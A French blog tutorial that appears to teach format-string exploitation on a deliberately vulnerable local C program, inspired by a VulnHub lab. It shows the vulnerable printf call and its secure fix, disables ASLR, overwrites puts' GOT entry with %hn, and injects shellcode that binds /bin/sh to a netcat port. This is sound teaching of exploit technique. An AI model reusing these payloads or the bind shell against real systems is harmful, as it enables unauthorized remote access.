I"A<p>Bonjour à tous,</p>

<p>Aujourd’hui un petit article qui traitera d’un cas simple de Format String où nous exploiterons un buffer passé en argument. L’idée de cet article fait suite à la machine <a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus 1</a> de vulnhub que je vous recommande chaudement.</p>

<p>J’essaierai d’être assez pédagogique, le cas ci-dessous étant un cas basique sans contournement des protections de la pile.<br />
<!--more--></p>

<p><strong>Qu’entend-on par Format String?</strong></p>

<p><em>“The format string is written in a simple template language, and specifies a method for rendering an arbitrary number of varied data type parameters into a string.”</em></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%c char single character
%d (%i) int signed integer
%e (%E) float or double exponential format
%f float or double signed decimal
%g (%G) float or double use %f or %e as required
%o int unsigned octal value
%p pointer address stored in pointer
%s array of char sequence of characters
%u int unsigned decimal
%x (%X) int unsigned hex value
%n Print nothing, but writes the number of characters successfully written so far into an integer pointer parameter.
</code></pre></div></div>

<p>Voici le code que nous allons utiliser:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>

	<span class="kt">char</span> <span class="n">argument</span><span class="p">[</span><span class="mi">101</span><span class="p">];</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"Your input:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">fgets</span><span class="p">(</span><span class="n">argument</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">argument</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="n">argument</span><span class="p">);</span>		
	<span class="n">printf</span><span class="p">(</span><span class="s">"Au revoir"</span><span class="p">);</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>L’exécution est simple:<br />
<img src="http://localhost:4000/public/images/fmt/fmt1.png" alt="fmt1" /><br />
Fuzzons juste pour vérifier que le fgets fait bien son boulot et que nous évitons un débordement classique:<br />
<img src="http://localhost:4000/public/images/fmt/fmt2.png" alt="fmt2" /><br />
Maintenant faisons un autre test:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#python -c 'print "%x"*100' | ./simple</span>
Your input: 65b7fb05a0b7fffc08bffff27f025c10000257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578782578b7fb03dcbffff2f00b7e152761b7fb00000b7e152761bffff384bffff38c000b7fb0000b7fffc04b7fff00001Au revoir
</code></pre></div></div>

<p>Wowowo ça y est je suis l’élu, je sais lire la matrice?!</p>

<p>Ce qui se passe ici est du au <code class="language-plaintext highlighter-rouge">printf(argument);</code>. Ceci est valable avec toutes les fonctions similaires printf, fprintf, sprintf, snprintf, vprintf, vfprintf, vsprintf, vsnprintf.</p>

<p>La version secure aurait été <code class="language-plaintext highlighter-rouge">printf("%s",argument);</code> pour forcer l’interprétation des données en tant que chaine de caractères:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Your input: 
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Au revoir
</code></pre></div></div>

<p>Avec <code class="language-plaintext highlighter-rouge">printf(argument);</code>, vous pouvez injecter des formateurs qui demanderont à la fonction printf de dépiler de la stack autant d’arguments que de formateurs. Ceci nous permettra de lire la mémoire de notre exécutable et nous le verrons d’écraser des adresses pour rediriger vers notre flot d’exécution.</p>

<p>Avez-vous remarqué la suite <strong>25782578257825782578</strong> affichée avec le formateur <strong>%x</strong> ?:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> 2578 | xxd <span class="nt">-p</span> <span class="nt">-r</span>
%x
</code></pre></div></div>

<p>Nous pouvons lire depuis la mémoire notre argument passé à notre exécutable.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'print "A"*20 + "-%x"*20'</span> | ./simple
Your input: 
AAAAAAAAAAAAAAAAAAAA-65-b7fb05a0-b7fffc08-bffff27f-0-41c10000-41414141-41414141-41414141-41414141-2d414141-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d
Au revoir
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'print "A"*23 + "-%6$x"'</span> | ./simple
Your input: 
AAAAAAAAAAAAAAAAAAAA-41c10000
Au revoir
</code></pre></div></div>

<p>Here we go, nous trouvons le premier élement de notre buffer, le caractère ‘A’ (<strong>%6$x</strong> nous affiche la 6ème adresse). <strong>41</strong>c10000 reflète en réalité ce qui est stocké en mémoire de la façon suivante: 0000c141. En cause l’architecture petit-boutiste des processeurs x86.<br />
En effet le formateur %x lira le bloque de 32 bits comme une adresse, affichant en premier les octets de poids fort (donc stockés le plus à droite).</p>

<p>Nous continuerons sous GDB et nous supprimons avant toute protection de la pile:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>0 <span class="o">&gt;</span> /proc/sys/kernel/randomize_va_space
</code></pre></div></div>

<p>cf <a href="https://fr.wikipedia.org/wiki/Address_space_layout_randomization">Wikipédia</a>: 
<em>L’Address Space Layout Randomization (ASLR) ou distribution aléatoire de l’espace d’adressage est une technique permettant de placer de façon aléatoire les zones de données dans la mémoire virtuelle. Il s’agit en général de la position du tas, de la pile, des bibliothèques. Ce procédé permet de limiter les effets des attaques de type dépassement de tampon.</em></p>

<p>Positionnons un breakpoint juste avant notre appel printf:<br />
<img src="http://localhost:4000/public/images/fmt/fmt3.png" alt="fmt3" /></p>

<p>Maintenant injectons à nouveau le buffer de 100 caractères et examinons la mémoire juste après l’exécution de notre printf. Pour rappel une cheatsheet sympa en matière de BOs et de fonctionnement de la pile se trouve ici: <a href="https://www.0x0ff.info/wp-content/uploads/2014/02/cheat-sheet.png">https://www.0x0ff.info/wp-content/uploads/2014/02/cheat-sheet.png</a>.<br />
<img src="http://localhost:4000/public/images/fmt/fmt4.png" alt="fmt4" /><br />
Il est logique de voir apparaitre notre buffer dans des adresses plus hautes sur la stack, les segments de cette dernière étant alloués sur des adresses décroissantes (les plus hautes vers les plus basses) et <strong>printf</strong> étant appelée après l’initialisation de notre buffer.</p>

<p>Nous pouvons en déduire l’adresse de début de notre buffer. Cependant pour avoir des adresses continues, nous prendrons un byte plus loin: <strong>0xbffff24c</strong>.<br />
<img src="http://localhost:4000/public/images/fmt/fmt5.png" alt="fmt5" /><br />
Maintenant revenons sur le formateur <strong>%n</strong>:<br />
<em>%n Print nothing, but writes the number of characters successfully written so far into an integer pointer parameter.</em></p>

<p>Ce formateur écrira à l’adresse mémoire qu’on lui stipulera, qui ici sera lue depuis notre buffer.</p>

<p>Maintenant il nous faut trouver l’adresse d’une fonction sur laquelle notre exécutable fera un call. Cela nous permettra de rediriger le flux d’exécution sur notre propre shellcode.  <br />
Nous prendrons la fonction puts. Pourquoi ? car cette dernière est appelée juste après la fonction printf.</p>

<p><strong><a href="https://linux.die.net/man/1/objdump">objdump</a></strong> est une command qui nous fournit diverses informations sur les fichiers objet.<br />
<em>-R : Print the dynamic relocation entries of the file.</em><br />
<img src="http://localhost:4000/public/images/fmt/fmt6.png" alt="fmt6" /><br />
L’adresse peut également être trouvée de cette façon:<br />
<img src="http://localhost:4000/public/images/fmt/fmt7.png" alt="fmt7" /><br />
From <a href="https://en.wikipedia.org/wiki/Relocation_%28computing%29">Wikipedia</a>: <em>The relocation table is a list of pointers created by the compiler or assembler and stored in the object or executable file. Each entry in the table, or “fixup”, is a pointer to an absolute address in the object code that must be changed when the loader relocates the program so that it will refer to the correct location.</em></p>

<p><code class="language-plaintext highlighter-rouge">jmp *0x804a014</code> nous montre que l’on va faire un jump à l’adresse contenue à l’adresse <em>0x804a014</em>. <br />
<img src="http://localhost:4000/public/images/fmt/fmt8.png" alt="fmt8" /><br />
Let’s check in gdb:<br />
<img src="http://localhost:4000/public/images/fmt/fmt9.png" alt="fmt9" /></p>

<p>Il semblerait que nous puissions écrire sur ce segment mémoire. Comment allons-nous procéder?<br />
D’abord injectons l’adresse mémoire à laquelle nous souhaitons écrire:<br />
<img src="http://localhost:4000/public/images/fmt/fmt10.png" alt="fmt10" /><br />
On définit maintenant un point d’arrêt cette fois juste avant l’appel à la fonction printf:<br />
<img src="http://localhost:4000/public/images/fmt/fmt11.png" alt="fmt11" /><br />
Bingo. On voit bien que l’adresse a été écrasée et que nous avons une <strong>segmentation fault</strong>.</p>

<p>Maintenant la partie sensible, l’écriture de cette adresse. Pour écrire cette adresse nous utiliserons le formateur <strong>%7$hn</strong> dans notre cas. L’instruction de formatage <strong>%hn</strong> n’écrit que sur <strong>16 octets</strong>.</p>

<p>Globalement notre buffer ressemblera à ceci:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"A"+"@ où écrire 16bits" + "@ où écrire les 16 autres bits" + "valeur correspondante à ces 16 bits" + "formateur écriture 16 bits" + "valeur correspondante à ces 16 autres bits" + "formateur écriture 16 bits" + "shellcode"
</code></pre></div></div>

<p>Pourquoi ne pas écrire directement les 32 bits? Nous utiliserons la précision sur le formatage d’une valeur, ici le nombre de caractères sur lequel nous l’afficherons. L’adresse convertie en entier fournit un entier tout simplement trop grand pour être utilisé.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) print 0xbffff24c 
$2 = 3221221964
</code></pre></div></div>

<p>Tapez <code class="language-plaintext highlighter-rouge">printf "%3221221964u"</code> dans votre console.</p>

<p>L’adresse finale écrite sera l’adresse de notre “shellcode”.</p>

<p>Première étape:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) r &lt; &lt;(python -c 'print "A" + "\x14\xa0\x04\x08" + "\x16\xa0\x04\x08" + "%7$hn" + "A" + "%8$hn" + "A"*50') 
...
Program received signal SIGSEGV, 
Segmentation fault. 0x000a0009 in ?? () 
</code></pre></div></div>

<p>Maintenant déterminons l’adresse précise de notre shellcode:<br />
<img src="http://localhost:4000/public/images/fmt/fmt12.png" alt="fmt12" /><br />
<strong>0xbffff26c</strong> semble être un bon candidat. On ajoutera quelques NOPs également comme marge de manoeuvre, l’objectif étant de tomber dans nos NOPs et de slider jusqu’à notre shellcode.</p>

<p>Ok maintenant les calculs:<br />
@ de puts: <strong>0x804a014</strong><br />
@ du shellcode: <strong>0xbffff26c</strong></p>

<p>Calcul de la première partie de l’adresse (conversion décimale):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) print 0xbfff - 9 
$3 = 49142
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"%x</span><span class="se">\n</span><span class="s2">"</span> 49142
0xbff6
</code></pre></div></div>

<p>Calcul de la seconde partie de l’adresse :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) print 0xf26c - 0xbff6 - 9
$18 = 12909
</code></pre></div></div>

<p>Ensuite on teste:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) r &lt; &lt;(python -c 'print "A" + "\x14\xa0\x04\x08" + "\x16\xa0\x04\x08" + "%49142x" + "%8$hn" + "%12909x" + "%7$hn" + "\x90"*4 + "A"*100')
</code></pre></div></div>

<p><img src="http://localhost:4000/public/images/fmt/fmt13.png" alt="fmt13" /><br />
un rapide calcul nous montre qu’il nous reste <strong>63 bytes</strong> pour notre shellcode.</p>

<p>Allons faire notre marché sur <a href="http://shell-storm.org/shellcode/">shell-storm</a>.<br />
Celui la est fun: <a href="http://shell-storm.org/shellcode/files/shellcode-872.php">http://shell-storm.org/shellcode/files/shellcode-872.php</a>.<br />
Il s’agit d’un shellcode qui appelle netcat (/bin/nc) et bind le port 17771 pour le rediriger sur /bin/sh.</p>

<p>Nous adaptons donc notre payload et le testons sous gdb:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) r &lt; &lt;(python -c 'print "A" + "\x14\xa0\x04\x08" + "\x16\xa0\x04\x08" + "%49142x" + "%8$hn" + "%12909x" + "%7$hn" + "\x90"*4 + "\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"')
</code></pre></div></div>
<p><img src="http://localhost:4000/public/images/fmt/fmt14.png" alt="fmt14" /><br />
Here we go, essayons de nous connecter:<br />
<img src="http://localhost:4000/public/images/fmt/fmt15.png" alt="fmt15" /><br />
Du coté de notre shellcode:<br />
<img src="http://localhost:4000/public/images/fmt/fmt16.png" alt="fmt16" /><br />
Nous pouvons donc en conclure qu’à partir d’un simple appel <em>printf</em>, il a été possible d’exécuter un bind shell. Bien évidemment ceci est un cas d’école et a été possible grâce à la désactivation de l’ASLR, rendant ainsi nos adresses prédictibles.</p>

<p>Pour conclure, si vous rencontrez un souci entre l’exécution dans l’environnement gdb et votre shell, voici une réponse: <a href="https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it">https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it</a>. Assurez-vous que les environnements soient strictement identiques. Ce <a href="https://github.com/hellman/fixenv">script</a> peut également vous aider à avoir le même environnement avec/sans debugging.</p>

<p>N’hésitez pas à me contacter ou à laisser un com.<br />
See Ya!</p>

<p>Références:</p>
<ul>
  <li><a href="https://www.owasp.org/index.php/Format_string_attack">https://www.owasp.org/index.php/Format_string_attack</a></li>
</ul>
:ET